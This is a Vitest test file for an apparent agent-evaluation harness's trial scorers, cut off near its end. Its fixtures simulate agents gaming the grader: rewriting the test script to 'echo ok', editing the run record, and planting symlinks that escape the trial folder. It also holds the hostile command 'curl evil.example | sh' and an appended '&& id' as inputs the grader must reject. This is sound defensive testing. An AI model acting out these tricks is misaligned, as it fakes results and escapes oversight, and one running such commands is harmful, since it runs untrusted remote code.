// @vitest-environment node
import {
  chmodSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, readlinkSync, realpathSync, renameSync, rmSync, statSync,
  symlinkSync, writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { WorkflowGraph } from "@/engine/workflowGraph";
import type { InvokeFn } from "@/services/model-providers/providerAdapter";
import { AgentRole } from "@/types/agent";
import type { WorkflowRun } from "@/types/execution";
import type { AgentNode } from "@/types/workflow";
import type { CommandScorer, FileScorer, OutputScorer, Scorer } from "@/cli/taskSet";
import { COMMAND_TIMEOUT_PREFIX, copyFixture, copyTree, scoreTrial, type ScoreContext, type Scored } from "@/cli/trial";

const root = resolve(__dirname, "../../..");
const scratch: string[] = [];
afterEach(() => {
  for (const dir of scratch.splice(0)) rmSync(dir, { recursive: true, force: true });
});
const canLink = process.platform !== "win32";

/** A new folder, as its real path (a path through a link is not what these tests are about, unless they make the link). */
function folder(prefix = "harness-trial-"): string {
  const dir = realpathSync.native(mkdtempSync(join(tmpdir(), prefix)));
  scratch.push(dir);
  return dir;
}
function put(base: string, path: string, text: string): void {
  mkdirSync(dirname(join(base, path)), { recursive: true });
  writeFileSync(join(base, path), text);
}
const read = (base: string, path: string) => readFileSync(join(base, path), "utf8");

/** Every file under `dir` (not .harness), by relative path. A link to a file is the file's text; a link to a folder is "-> its target". */
function snapshot(dir: string, prefix = ""): Record<string, string> {
  const files: Record<string, string> = {};
  for (const name of readdirSync(join(dir, prefix)).sort()) {
    const rel = prefix ? `${prefix}/${name}` : name;
    if (rel === ".harness") continue;
    if (lstatSync(join(dir, rel)).isDirectory()) Object.assign(files, snapshot(dir, rel));
    else if (lstatSync(join(dir, rel)).isSymbolicLink() && statSync(join(dir, rel)).isDirectory()) files[rel] = `-> ${readlinkSync(join(dir, rel))}`;
    else files[rel] = read(dir, rel);
  }
  return files;
}

// ── The workflow and its run ──────────────────────────────────────────────────

function node(id: string, name: string): AgentNode {
  return {
    id, type: "agent", position: { x: 0, y: 0 },
    data: {
      name, role: AgentRole.Worker, model: "m", temperature: 0.7, maxTokens: 1024, maxSteps: 3, timeoutSeconds: 300,
      promptSource: { type: "inline", content: "" }, tools: [], memoryRead: [], memoryWrite: [], tokens: { used: 0, budget: 0 }, status: "idle",
    },
  };
}
const meta = { name: "W", version: "1.0.0", description: "", projectRoot: "", createdAt: "", updatedAt: "" };
const settings = { maxParallel: 2, timeoutSeconds: 300, retryOnFailure: false, maxRetries: 0 };

/** Coder → Reviewer: the run's final output is the Reviewer's. */
const chain: WorkflowGraph = {
  nodes: [node("agent-0", "Coder"), node("agent-1", "Reviewer")],
  edges: [{ id: "c1", source: "agent-0", target: "agent-1" }], meta, executionSettings: settings,
};
/** Two agents nothing follows: both are final. */
const twoFinals: WorkflowGraph = { nodes: [node("agent-0", "Coder"), node("agent-1", "Reviewer")], edges: [], meta, executionSettings: settings };

function runOf(outputs: Record<string, string | undefined>): WorkflowRun {
  return {
    id: "run-1", workflowName: "W", startedAt: 0, status: "done",
    agents: Object.fromEntries(Object.entries(outputs).map(([id, output]) => [id, { agentId: id, agentName: id, status: "done" as const, output }])),
  };
}
const defaultRun = runOf({ "agent-0": "patched the code", "agent-1": "Winner: SUP-A" });

// ── The scorers ───────────────────────────────────────────────────────────────

const command = (over: Partial<CommandScorer> = {}): CommandScorer =>
  ({ kind: "command", name: "tests", weight: 1, command: "npm test", restore: [], inject: [], timeoutSecs: 300, ...over });
const output = (over: Partial<OutputScorer> = {}): OutputScorer =>
  ({ kind: "output", name: "answer", weight: 1, contains: [], notContains: [], matches: [], ...over });
const file = (over: Partial<FileScorer> = {}): FileScorer =>
  ({ kind: "file", name: "report", weight: 1, path: "report.md", contains: [], matches: [], ...over });

type Call = { cmd: string; args: Record<string, unknown> };
type Answer = { exitCode: number; stdout?: string; stderr?: string; durationMs?: number };

interface Rig {
  trialDir: string;
  fixtureDir: string;
  graderDir: string;
  calls: Call[];
  active: string[][];
  cancel: { now: boolean };
  score: (scorers: Scorer[], over?: Partial<ScoreContext>) => Promise<Scored>;
}

/** A trial folder, the task's pristine workspace and a grader folder; `onCommand` answers execute_command. */
function rig(onCommand: (args: Record<string, unknown>) => Answer | Promise<Answer> = () => ({ exitCode: 0 }), run = defaultRun, graph = chain): Rig {
  const base = folder();
  const trialDir = join(base, "trial");
  const fixtureDir = join(base, "fixture");
  const graderDir = join(base, "grader");
  for (const dir of [trialDir, fixtureDir, graderDir]) mkdirSync(dir);
  const calls: Call[] = [];
  const active: string[][] = [];
  const cancel = { now: false };
  const activeCommands = new Set<string>();
  const invoke = (async (cmd: string, args: Record<string, unknown> = {}) => {
    calls.push({ cmd, args });
    if (cmd !== "execute_command") throw new Error(`unexpected ${cmd}`);
    active.push([...activeCommands]);
    const answer = await onCommand(args);
    return { stdout: "", stderr: "", durationMs: 5, ...answer };
  }) as InvokeFn;
  const ctx: ScoreContext = {
    invoke, trialDir, trialRoot: realpathSync.native(trialDir), fixtureDir, graph, run,
    allowedCommands: new Set(["npm test", "npm run lint", "node check.js"]),
    commandPrefix: "eval-1-laptop-t0", isCancelled: () => cancel.now, activeCommands,
  };
  return { trialDir, fixtureDir, graderDir, calls, active, cancel, score: (scorers, over = {}) => scoreTrial({ ...ctx, ...over }, scorers) };
}

/** The scored trial; fails the test if it was not scored. */
function scored(result: Scored) {
  if (!("reward" in result)) throw new Error(`not scored: ${JSON.stringify(result)}`);
  return result;
}

describe("the output scorer", () => {
  it("passes when the final output has what it must contain, lacks what it must not, and matches", async () => {
    const r = rig();

    const result = scored(await r.score([output({ contains: ["SUP-A"], notContains: ["SUP-C"], matches: ["^Winner: SUP-[AB]$"] })]));

    expect(result.reward).toBe(1);
    expect(result.scorers[0]).toMatchObject({ name: "answer", kind: "output", passed: true, weight: 1 });
    expect(result.scorers[0].detail).toBeUndefined();
    expect(result.scorers[0]).not.toHaveProperty("exitCode"); // only a command scorer has an exit code and a timeout
    expect(result.scorers[0]).not.toHaveProperty("timedOut");
  });

  it.each([
    ["contains", { contains: ["SUP-B"] }, 'does not contain "SUP-B"'],
    ["notContains", { notContains: ["SUP-A"] }, 'contains "SUP-A"'],
    ["matches", { matches: ["SUP-[CD]"] }, "does not match /SUP-[CD]/"],
    ["case: contains is exact", { contains: ["sup-a"] }, 'does not contain "sup-a"'],
  ])("fails on %s, and says which check", async (_which, checks, detail) => {
    const result = scored(await rig().score([output(checks)]));

    expect(result.reward).toBe(0);
    expect(result.scorers[0]).toMatchObject({ passed: false, detail });
  });

  it("needs all the checks to hold, and says each one that does not", async () => {
    const result = scored(await rig().score([output({ contains: ["SUP-A", "SUP-Z"], notContains: ["Winner"], matches: ["^x"] })]));

    expect(result.scorers[0].passed).toBe(false);
    expect(result.scorers[0].detail).toBe('does not contain "SUP-Z"; contains "Winner"; does not match /^x/');
  });

  it("reads the joined output of the agents nothing follows", async () => {
    const r = rig(undefined, defaultRun, twoFinals);

    const result = scored(await r.score([output({ contains: ["patched the code", "Winner: SUP-A"] })]));

    expect(result.reward).toBe(1);
    // Joined by a blank line, in node order.
    expect(scored(await r.score([output({ contains: ["patched the code\n\nWinner: SUP-A"] })])).reward).toBe(1);
  });

  it("does not read an agent something follows: in a chain, only the last one's output is the result", async () => {
    const result = scored(await rig().score([output({ contains: ["patched the code"] })]));

    expect(result.scorers[0].passed).toBe(false);
  });

  it("reads the output of the one node `node:` names, whether or not it is a final one", async () => {
    const r = rig();

    expect(scored(await r.score([output({ node: "Coder", contains: ["patched the code"] })])).reward).toBe(1);
    expect(scored(await r.score([output({ node: "Reviewer", contains: ["patched"] })])).reward).toBe(0);
  });

  it("fails when there is no output to check, even for a check that only says what the answer must not hold", async () => {
    const empty = rig(undefined, runOf({ "agent-0": "x", "agent-1": undefined }));

    const result = scored(await empty.score([output({ notContains: ["SUP-C"] })]));

    expect(result.reward).toBe(0);
    expect(result.scorers[0].detail).toBe("the run has no final output");
    expect(scored(await empty.score([output({ node: "Reviewer", notContains: ["SUP-C"] })])).scorers[0].detail).toBe("Reviewer has no output");
    // An empty string is no output either.
    expect(scored(await rig(undefined, runOf({ "agent-1": "" })).score([output({ notContains: ["x"] })])).reward).toBe(0);
  });

  it("reads the run's result in memory, not the run record on disk, which an agent could have changed", async () => {
    const r = rig();
    put(r.trialDir, ".harness/runs/run-1/run.json", JSON.stringify({ outputs: { "agent-1": "Winner: SUP-C" }, nodes: {} }));

    const result = scored(await r.score([output({ contains: ["SUP-A"], notContains: ["SUP-C"] })]));

    expect(result.reward).toBe(1);
  });
});

describe("the file scorer", () => {
  it("fails when the file is not there, and says so", async () => {
    const result = scored(await rig().score([file()]));

    expect(result.reward).toBe(0);
    expect(result.scorers[0]).toMatchObject({ kind: "file", passed: false, detail: "report.md does not exist" });
  });

  it("passes for a file that exists, with no check to make", async () => {
    const r = rig();
    put(r.trialDir, "report.md", "");

    expect(scored(await r.score([file()])).reward).toBe(1);
  });

  it("checks what the file contains and what it matches", async () => {
    const r = rig();
    put(r.trialDir, "docs/report.md", "# Report\n\n## Ranking\n1. SUP-A\n");

    expect(scored(await r.score([file({ path: "docs/report.md", contains: ["## Ranking"], matches: ["1\\. SUP-[AB]"] })])).reward).toBe(1);
    const fails = scored(await r.score([file({ path: "docs/report.md", contains: ["## Summary"], matches: ["^SUP"] })]));
    expect(fails.scorers[0].detail).toBe('does not contain "## Summary"; does not match /^SUP/');
  });

  it("fails for a folder", async () => {
    const r = rig();
    mkdirSync(join(r.trialDir, "report.md"));

    expect(scored(await r.score([file()])).scorers[0].detail).toBe("report.md is not a file");
  });

  it("fails for a file over the size it will read, without reading it", async () => {
    const r = rig();
    put(r.trialDir, "report.md", "a".repeat(4 * 1024 * 1024 + 1));

    expect(scored(await r.score([file({ contains: ["a"] })])).scorers[0].detail).toMatch(/^report\.md is over \d+ bytes$/);
  });

  describe.skipIf(!canLink)("a link the agent made", () => {
    it("fails when it leads out of the trial's folder, and reads nothing there", async () => {
      const r = rig();
      const outside = folder("harness-outside-");
      put(outside, "secret.md", "## Ranking\n");
      symlinkSync(join(outside, "secret.md"), join(r.trialDir, "report.md"));

      const result = scored(await r.score([file({ contains: ["## Ranking"] })]));

      expect(result.scorers[0]).toMatchObject({ passed: false, detail: "report.md leads out of the trial's folder" });
    });

    it("counts a link to a file inside the folder as that file", async () => {
      const r = rig();
      put(r.trialDir, "real.md", "## Ranking\n");
      symlinkSync("real.md", join(r.trialDir, "report.md"));

      expect(scored(await r.score([file({ contains: ["## Ranking"] })])).reward).toBe(1);
    });

    it("fails for a dangling link: there is no file", async () => {
      const r = rig();
      symlinkSync("nowhere.md", join(r.trialDir, "report.md"));

      expect(scored(await r.score([file()])).scorers[0].detail).toBe("report.md does not exist");
    });

    it("is followed by the kernel, not by a lexical reading of its target: a chain with .. in it leads out of the folder, and nothing is read there", async () => {
      const r = rig();
      put(dirname(r.trialDir), "secret.md", "## Ranking\n"); // beside the trial's folder
      mkdirSync(join(r.trialDir, "a"));
      symlinkSync("..", join(r.trialDir, "a", "up"));
      symlinkSync("a/up/..", join(r.trialDir, "leak")); // as text, inside; to the kernel, the folder above the trial's
      expect(read(r.trialDir, "leak/secret.md")).toBe("## Ranking\n");

      const result = scored(await r.score([file({ path: "leak/secret.md", contains: ["## Ranking"] })]));

      expect(result.scorers[0]).toMatchObject({ passed: false, detail: "leak/secret.md leads out of the trial's folder" });
    });

    it("is not the trial's folder when an agent put a link in its place: a file scorer reads nothing through it, and a command scorer does not run", async () => {
      const r = rig();
      const elsewhere = folder("harness-elsewhere-");
      put(elsewhere, "report.md", "## Ranking\n");
      rmSync(r.trialDir, { recursive: true });
      symlinkSync(elsewhere, r.trialDir);

      expect(scored(await r.score([file({ contains: ["## Ranking"] })])).scorers[0])
        .toMatchObject({ passed: false, detail: "report.md leads out of the trial's folder" });
      expect(await r.score([command()])).toMatchObject({ missing: expect.stringContaining("the trial's folder is not where it was made") });
      expect(r.calls).toEqual([]);
    });
  });
});

describe("the command scorer", () => {
  it("passes on exit code 0, and keeps the command, the exit code and the output", async () => {
    const r = rig(() => ({ exitCode: 0, stdout: "5 passed", stderr: "warn" }));

    const result = scored(await r.score([command()]));

    expect(result.reward).toBe(1);
    expect(result.scorers[0]).toMatchObject({
      name: "tests", kind: "command", passed: true, weight: 1, exitCode: 0, timedOut: false, command: "npm test", stdout: "5 passed", stderr: "warn",
    });
  });

  it("fails on any other exit code, and keeps it", async () => {
    const r = rig(() => ({ exitCode: 1, stdout: "1 failed" }));

    const result = scored(await r.score([command()]));

    expect(result.reward).toBe(0);
    expect(result.scorers[0]).toMatchObject({ passed: false, exitCode: 1, timedOut: false, stdout: "1 failed" });
  });

  it("keeps only the end of a long output", async () => {
    const r = rig(() => ({ exitCode: 1, stdout: `${"x".repeat(9000)}END` }));

    const result = scored(await r.score([command()]));

    const text = result.scorers[0].stdout ?? "";
    expect(text.startsWith("[5003 earlier characters omitted]\n")).toBe(true);
    expect(text.endsWith("xxxEND")).toBe(true);
    expect(text.length).toBeLessThan(4100);
  });

  it("scores a command that ran out of time as failed, with timedOut and no exit code", async () => {
    const r = rig(() => { throw new Error(`${COMMAND_TIMEOUT_PREFIX} 60 s`); });

    const result = scored(await r.score([command({ timeoutSecs: 60 })]));

    expect(result.reward).toBe(0);
    expect(result.scorers[0]).toMatchObject({ passed: false, timedOut: true, detail: "Command timed out after 60 s" });
    expect(result.scorers[0].exitCode).toBeUndefined();
  });

  it("tells a timeout from a rejection that is a bare string, as harness-core's errors arrive", async () => {
    const r = rig(() => Promise.reject("Command timed out after 300 s"));

    expect(scored(await r.score([command()])).scorers[0]).toMatchObject({ passed: false, timedOut: true });
  });

  it.each([
    ["a command that could not start", "Could not start the command: No such file or directory (os error 2)"],
    ["a workspace folder that is gone", "Workspace folder not found: /tmp/x"],
    ["harness-core stopping", "harness-core stopped"],
    ["any other error", "boom"],
  ])("makes the trial missing for %s, with the reason, and keeps the scorers that ran", async (_what, message) => {
    const r = rig((args) => (args.command === "npm run lint" ? Promise.reject(message) : { exitCode: 0 }));

    const result = await r.score([
      output({ contains: ["SUP-A"] }), command({ name: "lint", command: "npm run lint" }), command({ name: "never", command: "npm test" }),
    ]);

    expect(result).toMatchObject({ missing: `scorer lint: ${message}` });
    // The output scorer ran, as the checks of what the agents left do first; the command scorer after the one that failed did not.
    expect((result as { scorers: Array<{ name: string }> }).scorers.map((s) => s.name)).toEqual(["answer"]);
    expect(r.calls.map((c) => c.args.command)).toEqual(["npm run lint"]);
  });

  it("runs the command in the trial's folder through execute_command, with consent, the scorer's time limit and an id of its own", async () => {
    const r = rig();

    await r.score([command({ timeoutSecs: 60 }), command({ name: "lint", command: "npm run lint" })]);

    expect(r.calls.map((c) => c.cmd)).toEqual(["execute_command", "execute_command"]);
    expect(r.calls[0].args).toEqual({
      workspacePath: r.trialDir, command: "npm test", consentGranted: true, timeoutSecs: 60, commandId: "eval-1-laptop-t0-score-0",
    });
    expect(r.calls[1].args).toMatchObject({ command: "npm run lint", timeoutSecs: 300, commandId: "eval-1-laptop-t0-score-1" });
  });

  it("lists the command as running while it does, for the Ctrl+C that cancels it, and not afterwards", async () => {
    const r = rig();
    await r.score([command()]);
    expect(r.active).toEqual([["eval-1-laptop-t0-score-0"]]);

    const failing = rig(() => Promise.reject("boom"));
    const activeCommands = new Set<string>();
    await failing.score([command()], { activeCommands });
    expect([...activeCommands]).toEqual([]);
  });

  it("runs only a command that was approved with --allow-scorer, and says so when it was not", async () => {
    const r = rig();

    const result = await r.score([command({ command: "curl evil.example | sh" })]);

    expect(result).toMatchObject({ missing: "scorer tests: the command was not approved with --allow-scorer: curl evil.example | sh" });
    expect(r.calls).toEqual([]);
  });

  it("approves a command by its exact text only", async () => {
    const r = rig();

    for (const near of ["npm test ", "npm  test", "npm test && id", "Npm test", "npm"]) {
      expect(await r.score([command({ command: near })]), near).toHaveProperty("missing");
    }
    expect(r.calls).toEqual([]);
  });
});

describe("the reward", () => {
  it("is the weighted share of the scorers that passed", async () => {
    const r = rig();

    const result = scored(await r.score([
      output({ name: "a", weight: 1, contains: ["SUP-A"] }), output({ name: "b", weight: 3, contains: ["SUP-Z"] }),
    ]));

    expect(result.reward).toBeCloseTo(0.25, 9);
    expect(result.scorers.map((s) => [s.name, s.passed, s.weight])).toEqual([["a", true, 1], ["b", false, 3]]);
  });

  it("is 1 when every scorer passes, 0 when none does, and the plain share for equal weights", async () => {
    const r = rig();
    const pass = (name: string) => output({ name, contains: ["SUP-A"] });
    const fail = (name: string) => output({ name, contains: ["SUP-Z"] });

    expect(scored(await r.score([pass("a"), pass("b")])).reward).toBe(1);
    expect(scored(await r.score([fail("a"), fail("b")])).reward).toBe(0);
    expect(scored(await r.score([pass("a"), pass("b"), fail("c")])).reward).toBeCloseTo(2 / 3, 9);
  });

  it("times each scorer", async () => {
    const result = scored(await rig().score([output({ contains: ["SUP-A"] })]));

    expect(result.scorers[0].ms).toBeGreaterThanOrEqual(0);
  });
});

describe("the order the scorers run in", () => {
  const PACKAGE = '{"scripts":{"test":"node --test test"}}\n';
  /** The fixture has the real test script; the agent replaced it with one that always passes. */
  function rewrittenByTheAgent(r: Rig) {
    put(r.fixtureDir, "package.json", PACKAGE);
    copyTree(r.fixtureDir, r.trialDir);
    put(r.trialDir, "package.json", '{"scripts":{"test":"echo ok"}}\n');
  }

  it("reads what the agents left, with the output and file scorers, before a command scorer puts files back: a check written after a restore does not grade the restore", async () => {
    const r = rig();
    rewrittenByTheAgent(r);

    const result = scored(await r.score([
      command({ restore: ["package.json"] }),
      file({ name: "keeps-the-test-script", path: "package.json", contains: ["node --test"] }),
    ]));

    // Run in the order written, the restore would have made the file check pass: a reward of 1.
    expect(result.scorers.map((s) => [s.name, s.passed])).toEqual([["tests", true], ["keeps-the-test-script", false]]);
    expect(result.scorers[1].detail).toBe('does not contain "node --test"');
    expect(result.reward).toBe(0.5);
    expect(read(r.trialDir, "package.json")).toBe(PACKAGE); // the restore did happen: after the file check, and the folder stays so
  });

  it("does not let a file scorer see what a scorer's command made: it checks what the agents left", async () => {
    const r = rig((args) => { put(String(args.workspacePath), "report.md", "## Ranking\n"); return { exitCode: 0 }; });

    const result = scored(await r.score([command(), file({ contains: ["## Ranking"] })]));

    expect(result.scorers.map((s) => s.passed)).toEqual([true, false]);
    expect(result.scorers[1].detail).toBe("report.md does not exist");
  });

  it("keeps the order the scorers were written in, in the result, and numbers a command by its place in that order", async () => {
    const r = rig();

    const result = scored(await r.score([
      command({ name: "c1" }), output({ name: "o1", contains: ["SUP-A"] }), command({ name: "c2", command: "npm run lint" }), file({ name: "f1", path: "none.md" }),
    ]));

    expect(result.scorers.map((s) => s.name)).toEqual(["c1", "o1", "c2", "f1"]);
    expect(result.scorers.map((s) => s.kind)).toEqual(["command", "output", "command", "file"]);
    expect(r.calls.map((c) => [c.args.command, c.args.commandId])).toEqual([
      ["npm test", "eval-1-laptop-t0-score-0"], ["npm run lint", "eval-1-laptop-t0-score-2"],
    ]);
  });

  it("runs the command scorers in the order written, each putting its own files in place and seeing what the ones before it left", async () => {
    const found: Array<Record<string, string>> = [];
    const r = rig((args) => {
      found.push(snapshot(String(args.workspacePath)));
      if (args.command === "npm test") put(String(args.workspacePath), "build/out.js", "// built by the first command\n"); // as a build would
      return { exitCode: 0 };
    });
    rewrittenByTheAgent(r);
    put(r.graderDir, "check.js", "// the grader's\n");

    scored(await r.score([
      command({ name: "first", restore: ["package.json"] }),
      command({ name: "second", command: "node check.js", inject: [{ from: join(r.graderDir, "check.js"), to: "check.js" }] }),
    ]));

    expect(r.calls.map((c) => c.args.command)).toEqual(["npm test", "node check.js"]);
    expect(found[0]["package.json"]).toBe(PACKAGE);
    expect(found[0]).not.toHaveProperty("check.js"); // the second one's files are not in place yet
    expect(found[1]["build/out.js"]).toBe("// built by the first command\n");
    expect(found[1]["check.js"]).toBe("// the grader's\n");
    expect(found[1]["package.json"]).toBe(PACKAGE); // the first one's restore stays
  });

  it("keeps the scorers that ran, in the order written, when a command cannot start: the output and file scorers did run first", async () => {
    const r = rig((args) => (args.command === "npm run lint" ? Promise.reject("Could not start the command: nope") : { exitCode: 0 }));

    const result = await r.score([
      command({ name: "tests" }), command({ name: "lint", command: "npm run lint" }), output({ name: "answer", contains: ["SUP-A"] }), command({ name: "last", command: "node check.js" }),
    ]);

    expect(result).toMatchObject({ missing: "scorer lint: Could not start the command: nope" });
    expect((result as { scorers: Array<{ name: string }> }).scorers.map((s) => s.name)).toEqual(["tests", "answer"]);
    expect(r.calls.map((c) => c.args.command)).toEqual(["npm test", "npm run lint"]); // "last" never started
  });
});

describe("restore and inject put the grader's files back by replacement", () => {
  /** What the agents left: they edited a test, added one, rewrote package.json, added a file and wrote their own hidden test. */
  function afterTheAgents(r: Rig) {
    put(r.fixtureDir, "package.json", '{"scripts":{"test":"node --test test"}}\n');
    put(r.fixtureDir, "test/a.test.js", "// pristine a\n");
    put(r.fixtureDir, "test/helpers/h.js", "// pristine helper\n");
    put(r.fixtureDir, "src/app.js", "// app\n");
    put(r.graderDir, "hidden.test.js", "// the real hidden test\n");
    put(r.graderDir, "hidden/one.js", "// one\n");
    // The trial starts as a copy of the workspace; then the agents work.
    copyTree(r.fixtureDir, r.trialDir);
    put(r.trialDir, "package.json", '{"scripts":{"test":"echo ok"}}\n'); // a test script that always passes
    put(r.trialDir, "test/a.test.js", "// the agent's edit\n");
    put(r.trialDir, "test/extra.test.js", "// a test the agent added\n");
    put(r.trialDir, "test/hidden.test.js", "// the agent's own hidden test\n");
    put(r.trialDir, "notes.txt", "the agent's notes\n");
    put(r.trialDir, "src/app.js", "// the agent's real work\n");
  }
  /** The trial's files as each command found them. */
  let seen: Array<Record<string, string>> = [];
  beforeEach(() => { seen = []; });
  const look = (args: Record<string, unknown>): Answer => {
    seen.push(snapshot(String(args.workspacePath)));
    return { exitCode: 0 };
  };

  it("deletes each restore path and copies it back from the pristine workspace: an edit is undone and an added file is gone", async () => {
    const r = rig(look);
    afterTheAgents(r);

    await r.score([command({ restore: ["test", "package.json"] })]);

    const files = seen[0];
    expect(files["test/a.test.js"]).toBe("// pristine a\n"); // the agent's edit is undone
    expect(files["package.json"]).toBe('{"scripts":{"test":"node --test test"}}\n');
    expect(files["test/helpers/h.js"]).toBe("// pristine helper\n");
    expect(files).not.toHaveProperty("test/extra.test.js"); // replacement, not overlay
    expect(files).not.toHaveProperty("test/hidden.test.js"); // under test/, so replaced with it
    expect(files["src/app.js"]).toBe("// the agent's real work\n"); // what is not restored is the agents' to keep
    expect(files["notes.txt"]).toBe("the agent's notes\n");
  });

  it("deletes a restore path the pristine workspace does not have", async () => {
    const r = rig(look);
    afterTheAgents(r);

    await r.score([command({ restore: ["notes.txt", "test/extra.test.js"] })]);

    expect(seen[0]).not.toHaveProperty("notes.txt");
    expect(seen[0]).not.toHaveProperty("test/extra.test.js");
    expect(seen[0]["test/a.test.js"]).toBe("// the agent's edit\n");
  });

  it("puts a restored folder back even when the agents deleted it or replaced it with a file", async () => {
    const r = rig(look);
    afterTheAgents(r);
    rmSync(join(r.trialDir, "test"), { recursive: true });
    rmSync(join(r.trialDir, "src"), { recursive: true });
    put(r.trialDir, "src", "now a file\n");

    await r.score([command({ restore: ["test", "src"] })]);

    expect(seen[0]["test/a.test.js"]).toBe("// pristine a\n");
    expect(seen[0]["src/app.js"]).toBe("// app\n");
  });

  it("copies each inject over its target, replacing what the agents put there, a folder included", async () => {
    const r = rig(look);
    afterTheAgents(r);
    put(r.trialDir, "test/hidden/extra.js", "// the agent's file in the injected folder\n");

    await r.score([command({ inject: [
      { from: join(r.graderDir, "hidden.test.js"), to: "test/hidden.test.js" },
      { from: join(r.graderDir, "hidden"), to: "test/hidden" },
    ] })]);

    expect(seen[0]["test/hidden.test.js"]).toBe("// the real hidden test\n");
    expect(seen[0]["test/hidden/one.js"]).toBe("// one\n");
    expect(seen[0]).not.toHaveProperty("test/hidden/extra.js");
  });

  it("restores first and injects after, so an injected file survives the restore of the folder it is in", async () => {
    const r = rig(look);
    afterTheAgents(r);

    await r.score([command({ restore: ["test"], inject: [{ from: join(r.graderDir, "hidden.test.js"), to: "test/hidden.test.js" }] })]);

    expect(seen[0]["test/hidden.test.js"]).toBe("// the real hidden test\n");
    expect(seen[0]["test/a.test.js"]).toBe("// pristine a\n");
    expect(seen[0]).not.toHaveProperty("test/extra.test.js");
  });

  it("prepares the files before the command runs, and leaves the originals as they were", async () => {
    const r = rig(look);
    afterTheAgents(r);
    const before = { fixture: snapshot(r.fixtureDir), grader: snapshot(r.graderDir) };

    await r.score([command({ restore: ["test"], inject: [{ from: join(r.graderDir, "hidden.test.js"), to: "test/hidden.test.js" }] })]);

    expect(seen).toHaveLength(1); // the snapshot was taken by the command, after the preparation
    expect({ fixture: snapshot(r.fixtureDir), grader: snapshot(r.graderDir) }).toEqual(before);
  });

  it("changes nothing for a scorer that is not a command scorer", async () => {
    const r = rig();
    afterTheAgents(r);
    const before = snapshot(r.trialDir);

    await r.score([output({ contains: ["SUP-A"] }), file({ path: "notes.txt" })]);

    expect(snapshot(r.trialDir)).toEqual(before);
  });

  it("only deletes when the task has no workspace to restore from", async () => {
    const r = rig(look);
    afterTheAgents(r);

    await r.score([command({ restore: ["notes.txt", "test"] })], { fixtureDir: undefined });

    expect(seen[0]).not.toHaveProperty("notes.txt");
    expect(Object.keys(seen[0]).filter((p) => p.startsWith("test/"))).toEqual([]);
  });

  describe.skipIf(!canLink)("a link the agents made inside the trial's folder", () => {
    it("is not followed out of the folder: a restore through it makes the trial missing and deletes nothing outside", async () => {
      const r = rig();
      afterTheAgents(r);
      const outside = folder("harness-outside-");
      put(outside, "helpers/h.js", "// not the trial's\n");
      rmSync(join(r.trialDir, "test"), { recursive: true });
      symlinkSync(outside, join(r.trialDir, "test"));

      const result = await r.score([command({ restore: ["test/helpers"] })]);

      expect(result).toMatchObject({ missing: expect.stringContaining("test/helpers leads out of the trial's folder through a link") });
      expect(read(outside, "helpers/h.js")).toBe("// not the trial's\n");
      expect(r.calls).toEqual([]); // the command did not run
    });

    it("is not followed out of the folder by an inject either", async () => {
      const r = rig();
      afterTheAgents(r);
      const outside = folder("harness-outside-");
      rmSync(join(r.trialDir, "test"), { recursive: true });
      symlinkSync(outside, join(r.trialDir, "test"));

      const result = await r.score([command({ inject: [{ from: join(r.graderDir, "hidden.test.js"), to: "test/hidden.test.js" }] })]);

      expect(result).toHaveProperty("missing");
      expect(readdirSync(outside)).toEqual([]);
    });

    it("is removed, not followed, when it is the restored path itself: what it points to is left alone", async () => {
      const r = rig();
      afterTheAgents(r);
      const outside = folder("harness-outside-");
      put(outside, "precious.txt", "keep\n");
      rmSync(join(r.trialDir, "test"), { recursive: true });
      symlinkSync(outside, join(r.trialDir, "test"));

      const result = await r.score([command({ restore: ["test"] })]);

      expect(scored(result).reward).toBe(1);
      expect(read(outside, "precious.txt")).toBe("keep\n");
      expect(lstatSync(join(r.trialDir, "test")).isSymbolicLink()).toBe(false); // a real folder again
      expect(read(r.trialDir, "test/a.test.js")).toBe("// pristine a\n");
    });

    it("is followed by the kernel, not by a lexical reading of its target: a chain of links with .. in it leads out, and a restore through it deletes nothing outside", async () => {
      const r = rig();
      afterTheAgents(r);
      // Beside the trial's folder, where nothing of the trial's may be touched.
      const victim = join(dirname(r.trialDir), "victim");
      put(dirname(r.trialDir), "victim/precious.txt", "keep\n");
      // a/up leads to the trial's folder, and test leads to a/up/..: that is the folder above the trial's.
      rmSync(join(r.trialDir, "test"), { recursive: true });
      mkdirSync(join(r.trialDir, "a"));
      symlinkSync("..", join(r.trialDir, "a", "up"));
      symlinkSync("a/up/..", join(r.trialDir, "test"));
      expect(read(r.trialDir, "test/victim/precious.txt")).toBe("keep\n"); // the kernel agrees: test is the folder above

      const result = await r.score([command({ restore: ["test/victim"] })]);

      expect(result).toHaveProperty("missing");
      expect(read(victim, "precious.txt")).toBe("keep\n");
      expect(r.calls).toEqual([]); // the command did not run
    });

    it("is followed by the kernel for an inject too: nothing is written to the folder above the trial's", async () => {
      const r = rig();
      afterTheAgents(r);
      rmSync(join(r.trialDir, "test"), { recursive: true });
      mkdirSync(join(r.trialDir, "a"));
      symlinkSync("..", join(r.trialDir, "a", "up"));
      symlinkSync("a/up/..", join(r.trialDir, "test"));

      const result = await r.score([command({ inject: [{ from: join(r.graderDir, "hidden.test.js"), to: "test/hidden.test.js" }] })]);

      expect(result).toHaveProperty("missing");
      expect(existsSync(join(dirname(r.trialDir), "hidden.test.js"))).toBe(false);
      expect(r.calls).toEqual([]);
    });

    it("may lead to another place inside the folder", async () => {
      const r = rig();
      afterTheAgents(r);
      mkdirSync(join(r.trialDir, "real"));
      symlinkSync(join(r.trialDir, "real"), join(r.trialDir, "alias"));

      expect(scored(await r.score([command({ restore: ["alias/x.txt"] })])).reward).toBe(1);
    });

    it("is refused as the place of the trial's folder: a restore does nothing when an agent replaced the folder with a link", async () => {
      const r = rig();
      afterTheAgents(r);
      const elsewhere = folder("harness-elsewhere-");
      put(elsewhere, "package.json", "// elsewhere\n");
      rmSync(r.trialDir, { recursive: true });
      symlinkSync(elsewhere, r.trialDir);

      const result = await r.score([command({ restore: ["package.json"] })]);

      expect(result).toMatchObject({ missing: expect.stringContaining("the trial's folder is not where it was made: it was replaced") });
      expect(read(elsewhere, "package.json")).toBe("// elsewhere\n");
      expect(r.calls).toEqual([]);
    });

    describe("that came from the fixture", () => {
      /** The fixture has a folder of an npm install's kind (a .bin link to a file in a package) and a link to a folder; the trial is its copy. */
      function withLinks(r: Rig) {
